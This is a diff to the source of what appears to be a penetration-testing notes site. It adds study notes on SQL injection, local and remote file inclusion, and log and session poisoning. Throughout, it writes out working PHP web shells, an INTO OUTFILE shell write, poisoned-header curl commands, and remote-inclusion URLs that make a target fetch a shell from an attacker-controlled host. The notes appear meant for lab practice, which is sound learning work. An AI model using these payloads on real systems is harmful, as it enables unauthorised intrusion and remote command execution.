@@ -713,10 +713,10 @@ Add <span class="cmd">**' -- -**</span> in the URL because the space in the end 
 
 ### In Oracle database:
 
-• every SELECT statement must specify a table to select FROM  
-• built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual  
+• every <span class="cmd">SELECT</span> statement must specify a table to select FROM  
+• built-in table on Oracle called <span class="cmd">dual</span> which you can use for this purpose. For example: <span class="cmd">UNION SELECT 'abc' FROM dual</span>  
 • practice: [https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)  
-• Field in v$verison: banner. use null in other placeholders if error arises
+• Field in <span class="cmd">v$verison</span>: <span class="cmd">banner</span>. use <span class="cmd">NULL</span> in other placeholders if error arises
 
 # UNION Attacks
 
@@ -768,7 +768,7 @@ The **TABLES** table in the **INFORMATION_SCHEMA** Database contains info about 
 
 The **COLUMNS** table in the **INFORMATION_SCHEMA** Database contains information about all columns.  
 **Main columns:** <span class="cmd">COLUMN_NAME</span>, <span class="cmd">TABLE_NAME</span>, and <span class="cmd">TABLE_SCHEMA</span>  
-<span class="cmd">	SELECT TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS</span>
+<span class="cmd">	SELECT COLUMN_NAME, TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS</span>
 
 ## Retrieving data
 
@@ -812,8 +812,8 @@ In MariaDB / MySQL, can be used to read data from file
 # Writing Files
 
 We must have the following:  
-• User with FILE privilege enabled  
-• MySQL global secure_file_priv variable not enabled  
+• User with <span class="cmd">FILE</span> privilege enabled  
+• MySQL global <span class="cmd">secure_file_priv</span> variable **not** enabled  
 • Write access to the location we want to write to on the back-end server
 
 ### secure_file_priv
@@ -851,7 +851,7 @@ Write through SQLi:
 <span class="cmd">select '<?php system($_REQUEST[0]); ?>' into outfile '/var/www/html/shell.php'</span>  
 To execute commands: <span class="cmd">/filename.php?0=[command]</span>
 
-NOTE: all the placeholders/columns must be satisfied. for columns use open,close quotes ""`,
+NOTE: all the placeholders/columns must be satisfied. for columns use open and close quotes ""`,
                 children: [
                   {
                     slug: "sqlmap",
@@ -942,7 +942,7 @@ NOTE: **convert.base64-encode** (Conversion Filter) is the one useful for LFI at
 
 ### Fuzz for php files
 
-<span class="cmd">ffuf -ic -w /usr/share/wordlists/SecLists/Discovery/Web-Content/medium.txt -u http://[MACHINE_IP]/FUZZ.php</span>  
+<span class="cmd">ffuf -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/medium.txt -u http://[MACHINE_IP]/FUZZ.php</span>  
 Read discovered files' source, then scan them for further referenced PHP files - repeat until app source/logic is mapped
 
 ## Standard PHP LFI
@@ -959,7 +959,7 @@ Eg: <span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=php://filter
 • Decode the returned base64 string:  
 <span class="cmd">echo 'BASE64_STRING' | base64 -d</span>
 
-# Remote Code Execution using LFI
+# Remote Code Execution
 
 ## PHP Wrappers
 
@@ -968,6 +968,7 @@ Eg: <span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=php://filter
 Data wrapper can be used to include external data, including php code. <span class="cmd">allow_url_include</span> must be enabled in PHP configurations.  
 • Check PHP configurations  
 <span class="cmd">X.Y</span> : PHP Version  
+NOTE:** Start with latest** PHP version, and **then try earlier versions** if the configuration file couldn't be located.  
 Apache: <span class="cmd">/etc/php/X.Y/apache2/php.ini</span>  
 Nginx: <span class="cmd">/etc/php/X.Y/fpm/php.ini</span>  
 Eg: <span class="cmd">curl "http://[SERVER_IP]:[PORT]/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"</span>  
@@ -976,9 +977,201 @@ If <span class="cmd">allow_url_include</span> is On then:
 Encode basic PHP webshell into base64:  
 <span class="cmd">echo '<?php system($_GET["cmd"]); ?>' | base64</span>  
 Then URL encode the base64 text and pass it to the data wrapper. We can then pass the command to the webshell:  
-<span class="cmd">data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id</span>
+<span class="cmd">data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id</span>  
+<span class="cmd">Eg: http://[MACHINE_IP]:[PORT]/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id</span>
 
-### Input`,
+### Input
+
+Difference from Data wrapper: Input is sent to the wrapper as a POST request's data.  
+• <span class="cmd">allow_url_include</span> needs to be On like above.  
+• To repeat earlier attack, send POST request with webshell as the data:  
+Eg:   
+<span class="cmd">curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://[MACHINE_IP]:[PORT]/index.php?language=php://input&cmd=id"</span>  
+• To pass commands like <span class="cmd">ls /</span> or <span class="cmd">cat flag.txt</span>, URL encode 'space' with <span class="cmd">+</span> or <span class="cmd">%20</span>  
+• To pass the command as GET parameter, <span class="cmd">$_REQUEST</span> (GET request) must be enabled/used. If only POST is enabled: Pass the command directly in PHP code:  
+Eg: <span class="cmd"><\\?php system('id')?></span>
+
+### Expect
+
+• Allows to run commands directly through URL streams  
+NOTE: expect is external wrapper and must be manually installed in backend  
+• <span class="cmd">extension=expect</span> must be present, check the way we did for <span class="cmd">allow_url_include</span> : This just says that server is configured to attempt to load the <span class="cmd">expect</span> extension but does NOT guarantee that extension is actually functional at runtime.  
+• To confirm if it is actually available, we need to test it by attempting command execution by using <span class="cmd">expect://</span> wrapper:  
+<span class="cmd">curl -s "http://[MACHINE_IP]:[PORT]/index.php?language=expect://id"</span>
+
+## Remote File Inclusion (RFI)
+
+### Verify RFI
+
+• Check if <span class="cmd">allow_url_include</span> is On using above steps  
+• Even if it is, the vulnerable function may not allow remote URL inclusion. Always try to include a local URL:  
+Eg: <span class="cmd">http://127.0.0.1:80/index.php</span>  
+<span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=http://127.0.0.1:80/index.php</span>  
+NOTE:  
+	If the PHP code gets rendered and just not displayed, then the vulnerable funciton also allows PHP execution  
+	It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.
+
+### Remote Code Execution with RFI
+
+We can use a custom webshell, reverse shell or a simple webshell like this:  
+<span class="cmd">echo '<?php system($_GET["cmd"]); ?>' > shell.php</span>  
+Tip: Use a common port number because it may be whitelisted
+
+**HTTP**  
+• Start a Python webserver:  
+<span class="cmd">sudo python3 -m http.server [PORT]</span>  
+• Include local shell through RFI:  
+<span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=http://[OUR_IP]:[PORT]/shell.php&cmd=id</span>
+
+**FTP**  
+• Start Python FTP server:  
+<span class="cmd">sudo python -m pyftpdlib -p 21</span>  
+May be useful if HTTP ports or the string <span class="cmd">http://</span> string are blocked by the firewall   
+• Include the local shell:  
+<span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=ftp://[OUR_IP]/shell.php&cmd=id</span>  
+• By default, PHP tries to authenticate anonymously. For valid authentication, include creds in URL:  
+<span class="cmd">curl 'http://[MACHINE_IP]:[PORT]/index.php?language=ftp://user:pass@[OUR_IP]/shell.php&cmd=id'</span>
+
+**SMB**  
+If it's hosted on Windows webserver, we DO NOT need <span class="cmd">allow_url_include</span> to be enabled  
+Because Windows treats files on remote SMB servers as normal files  
+• Start SMB server:  
+<span class="cmd">impacket-smbserver -smb2support share $(pwd)</span>  
+• Include the PHP script by using UNC path:  
+<span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=\\\\[PORT]\\share\\shell.php&cmd=whoami </span>  
+NOTE: This technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.
+
+# LFI and File Uploads
+
+Even if file upload vulnerability is NOT present, we can get RCE by uploading a file (like '<span class="cmd">.jpg</span>') containing PHP code, then triggering it through the LFI include.
+
+### **Image Upload**
+
+**Crafting Malicious Image**  
+• Use allowed filename extension and include the image magic bytes at the beginning, in case both extension and content type are checked.  
+<span class="cmd">echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif</span>  
+NOTE: GIF image's magic bytes are easily typed as they are ASCII characters. Other extensions have magic bytes in binary that we need to URL encode.  
+• Now upload the file
+
+**Uploaded File Path**  
+After uploading the file, we need to include it. We need the path to the uploaded file to do this.  
+• Inspect source code after uploading image  
+NOTE: If we do not know where the file is uploaded, then we can fuzz for an uploads directory, and then fuzz for our uploaded file, though this may not always work as some web applications properly hide the uploaded files.  
+• Include uploaded file in vulnerable function to execute the PHP code  
+<span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=[path_to_image]&cmd=id</span>  
+NOTE: In case the LFI did prefix a directory before our input, then we simply need to <span class="cmd">../</span> out of that directory and then use our URL path.
+
+**ZIP Upload**  
+zip wrapper not enabled by default  
+• PHP shell and zip it:  
+<span class="cmd">echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php</span>  
+<span class="cmd">shell.jpg</span> is the zip archive name and <span class="cmd">shell.php</span> is the file inside it  
+NOTE: Some upload forms may still detect the file as zip archive through content-type tests, higher chance of working if the upload of zip archives is allowed.  
+• After uploading <span class="cmd">shell.jpg</span> archive, include with <span class="cmd">zip://</span> wrapper and refer files within it using <span class="cmd">#</span> (URL encoded: <span class="cmd">**%23**</span>). Execute commands as usual  
+<span class="cmd">zip://./[uploads_folder]/shell.jpg%23shell.php&cmd=id</span>  
+Eg:<span class="cmd"> http://[MACHINE_IP]:[PORT]/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id</span>  
+	Upload folder is added before file name as vulnerable page is in main directory
+
+**Phar Upload**  
+Write following PHP code into a file:  
+<span class="cmd"><?php</span>  
+<span class="cmd">$phar = new Phar('shell.phar');</span>  
+<span class="cmd">$phar->startBuffering();</span>  
+<span class="cmd">$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');</span>  
+<span class="cmd">$phar->setStub('<?php __HALT_COMPILER(); ?>');</span>  
+<span class="cmd">$phar->stopBuffering();</span>  
+Compile this into a phar file. When called, it will write a web shell to a <span class="cmd">shell.txt</span> sub-file, which can be interacted with. Compile it into a phar file and rename it to <span class="cmd">shell.jpg</span>:  
+<span class="cmd">php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg</span>  
+Upload the phar file <span class="cmd">shell.jpg</span> and call it with <span class="cmd">phar://</span> and specify the phar sub-file with <span class="cmd">/</span> (URL encoded: <span class="cmd">%2F</span>)  
+<span class="cmd">phar://./[uploads_folder]/shell.jpg%2Fshell.txt&cmd=id</span>  
+Eg: <span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id</span>
+
+Obsolete LFI attack: LFI + uploads enabled + old PHP + exposed phpinfo() then: [https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html)
+
+## Log Poisoning
+
+Writing PHP code into a field that gets logged, then including that log file via LFI to execute it. Requires the app to have read privileges over the log file.
+
+**PHP Session Poisoning**  
+General info: Most PHP web applications utilize <span class="cmd">PHPSESSID</span> cookies, which can hold specific user-related data, so the web application can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in <span class="cmd">/var/lib/php/sessions/</span> on Linux and in <span class="cmd">C:\\Windows\\Temp\\</span> on Windows. The name of the file that contains our user's data matches the name of our <span class="cmd">PHPSESSID</span> cookie with the <span class="cmd">sess_</span> prefix.  
+• Check for cookie named PHPSESSID  
+• File will be stored at <span class="cmd">/var/lib/php/sessions/sess_[cookie_value]</span> or <span class="cmd">C:\\Windows\\Temp\\sess_[cookie_value] </span>  
+• Include the session file through LFI  
+<span class="cmd">/var/lib/php/sessions/sess_[cookie_value]</span>  
+Eg: <span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=/var/lib/php/sessions/sess_[cookie_value]</span>  
+• See which parameter is controllable - set the value of parameter to random value and include the above file to see which parameter has changed.  
+• Write basic webshell by changing the above parameter to URL encoded webshell  
+<span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?[vulnerable_parameter]=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</span>  
+• Then include the session file and execute commands  
+<span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?[vulnerable_parameter]=/var/lib/php/sessions/sess_[cookie_value]&cmd=id</span>  
+NOTE: To execute another command, session file has to be poisoned with the web shell again, as it gets overwritten with <span class="cmd">/var/lib/php/sessions/sess_[cookie_value]</span>  
+	Use poisoned webshell to write permanent webshell or to send reverse shell.
+
+**Server Log Poisoning**  
+General ino: Both Apache and Nginx maintain log files, such as <span class="cmd">access.log</span> (info about requests made to the server, including User-Agent header) and <span class="cmd">error.log</span>. We can control User-Agent header, we can use it to poison the server logs as we did above.   
+	Once poisoned, include the logs through the LFI; read-access required over the logs.   
+	Nginx logs are readable by low privileged users by default (e.g. www-data).   
+	Apache logs are only readable by high privileged users (e.g. root/adm groups). In older or misconfigured servers, these may be readable by low-privileged users.  
+Location:  
+	Apache logs: <span class="cmd">/var/log/apache2/</span> or <span class="cmd">C:\\xampp\\apache\\logs\\</span>  
+	Nginx logs: <span class="cmd">/var/log/nginx/</span> or <span class="cmd">C:\\nginx\\log\\</span>  
+• Try including a log file in the vulnerable parameter  
+Eg: <span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?[parameter]=/var/log/apache2/access.log</span>  
+Tip: Logs tend to be huge, so it might take some time to load, or may even crash sometimes.  
+• Intercept the LFI request on Burpsuite and change the <span class="cmd">User-Agent</span> header to "Log poisoning"  
+• Include the log file again to see if is shows up in the log file.  
+• Now poison the header with a webshell in Burpsuite or terminal:  
+<span class="cmd">echo -n "User-Agent: <?php system(\\$_GET['cmd']); ?>" > poison</span>  
+<span class="cmd">curl -s "http://[MACHINE_IP]:[PORT]/index.php" -H @poison</span>  
+• Execute the command  
+<span class="cmd">curl -s "http://[MACHINE_IP]:[PORT]/var/log/apache2/access.log&cmd=id"</span>
+
+Some service logs that we may be able to read:  
+<span class="cmd">/var/log/sshd.log</span>  
+<span class="cmd">/var/log/mail</span>  
+<span class="cmd">/var/log/vsftpd.log</span>  
+For example, if the ssh or ftp services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute.
+
+## Automated Scanning
+
+### Fuzzing Parameters
+
+<span class="cmd">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://[MACHINE_IP]:[PORT]/index.php?FUZZ=value'</span>  
+Most popular LFI parameters: [https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters](https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters)
+
+### LFI Wordlists
+
+<span class="cmd">/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt</span>  
+• Test common paylods  
+<span class="cmd">ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://[MACHINE_IP]:[PORT]/index.php?[parameter]=FUZZ'</span>  
+• Manually test the identified payloads to verify its working and show the included file's content
+
+### Fuzzing Server Files
+
+**Server webroot**  
+Sometimes relative paths may not work so we need to find the server webroot path.  
+Web root wordlist:  
+	Linux: <span class="cmd">/usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt</span>  
+	Windows: <span class="cmd">/usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt</span>  
+• Find the servers webroot  
+<span class="cmd">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt -u 'http://[MACHINE_IP]:[PORT]/index.php?language=../../../../FUZZ/index.php'</span>  
+The number of <span class="cmd">../</span> doesn't matter anyways (check top of page)
+
+**Server Logs/Configurations**  
+<span class="cmd">/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt</span>  
+Linux: [https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)  
+Windows: [https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)  
+Eg: <span class="cmd">ffuf -w ./LFI-WordList-Linux -u 'http://[MACHINE_IP]:[PORT]/index.php?language=../../../../FUZZ'</span>  
+Common Apache server config. path: <span class="cmd">/etc/apache2/apache2.conf</span>  
+Sometimes, global apache variables might be used, these can be found in:   
+Apache environment variables path: <span class="cmd">/etc/apache2/envvars</span>
+
+**LFI Tools**  
+Common tools:  
+LFISuite: [https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)  
+LFiFreak: [https://github.com/OsandaMalith/LFiFreak](https://github.com/OsandaMalith/LFiFreak)  
+liffy: [https://github.com/mzfr/liffy](https://github.com/mzfr/liffy)  
+Unfortunately, most of them use python2 and are no longer maintained.`,
               },
               {
                 slug: "file-upload",
@@ -3372,14 +3565,12 @@ Active Directory`,
       • <span class="cmd">nc [MACHINE_IP}</span>  
       • <span class="cmd">whatweb [MACHINE_IP}</span>  
 <span class="cmd">     </span> • <span class="cmd">whatweb --no-errors [network_ip_range]</span>  
-      •   
 ☐ View certificates in https site	  
 ☐ Add domain to /etc/hosts: <span class="cmd">echo "[IP] [domain]" | sudo tee -a /etc/hosts</span>  
 ☐ Extension fuzzing: using burp-parameter and  <span class="cmd">/indexFUZZ</span>  
 ☐ Directory and file fuzzing  
 ☐ Subdomain enumeration  
-☐ vhosts enumeration  
-☐ 
+☐ vhosts enumeration
 
 Wordlists to use: [Wordlists](/notes/pentest-notes/enumeration/wordlists)`,
           },
